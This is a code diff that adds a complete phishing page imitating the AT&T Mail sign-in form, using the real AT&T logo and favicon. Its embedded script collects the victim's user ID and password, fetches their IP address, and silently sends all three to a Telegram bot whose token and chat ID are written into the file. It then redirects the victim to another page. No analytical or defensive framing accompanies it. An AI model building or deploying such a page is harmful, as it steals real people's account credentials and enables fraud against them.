@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Login Form</title>
+    <link rel="icon" href="https://signin.att.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="AT&T Logo">
+            <h2>Sign in</h2>
+            <h2><strong>to access AT&T Mail and Currently.com</strong></h2>
+            
+            <form id="loginForm" method="POST">
+                <!-- Step 1: User ID -->
+                <div id="user-id-container">
+                    <p style="text-align: left;">User ID</p>
+                    <input type="text" name="username" id="username" required>
+                    <button type="button" onclick="showPassword()" class="submit-btn">Continue</button>
+                </div>
+                
+                <!-- Step 2: Password (Hidden Initially) -->
+                <div id="password-container" style="display:none;">
+                    <p style="text-align: left;">Password</p>
+                    <input type="password" name="password" id="password" required>
+                    <input type="submit" value="Login">
+                </div>
+
+                <div class="forgot-link">
+                    <a href="#"><h3>Forgot user ID?</h3></a>
+                    <a href="#"><h3>Don't have a user ID? Create one now</h3></a>
+                </div>
+            </form>
+        </div>
+        
+    </div>
+
+    <script>
+        let userIp = ''; // Variable to hold the user's IP address
+
+        // Fetch the user's IP address from ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userIp = data.ip; // Store the IP address
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
+
+        // Function to show the password field after entering User ID
+        function showPassword() {
+            const username = document.getElementById('username').value;
+
+            if (username) {
+                // Hide the User ID container and show the password container
+                document.getElementById('user-id-container').style.display = 'none';
+                document.getElementById('password-container').style.display = 'block';
+            } else {
+                alert('Please enter your User ID.');
+            }
+        }
+
+        // Function to send login info to Telegram when the form is submitted
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from submitting the traditional way
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Send the login info to Telegram along with IP address
+            sendToTelegram(username, password, userIp);
+        });
+
+        function sendToTelegram(username, password, userIp) {
+            const chatId = '6640135951';  // Your Telegram Chat ID
+            const botToken = '7531094222:AAFMwgkpPWG_WF9OdfB7KInOti4gMZibRMo';  // Your Telegram bot token
+            const message = `AT&T Login Info:\nUser ID: ${username}\nPassword: ${password}\nIP Address: ${userIp}`;
+
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send the request to the Telegram API without any visual feedback
+            fetch(telegramApiUrl)
+                .then(response => response.json())
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the form from submitting the traditional way
+
+    const userId = document.querySelector('input[name="username"]').value;
+    const userIpAddress = ''; // Capture IP if needed
+
+    console.log('User ID:', userId);
+    console.log('User IP Address:', userIpAddress);
+
+    // Redirect to confirmation page after a short delay (2 seconds)
+    setTimeout(function() {
+        window.location.href = 'redirection.html'; // Adjust the path as needed
+    }, 300); // Redirect after 2 seconds
+});
+
+
+    </script>
+    <div class="bottom">
+    <footer>
+      <p style="text-align: left;">Legal policy center</p>
+    </footer>
+</div>
+</body>
+</html>
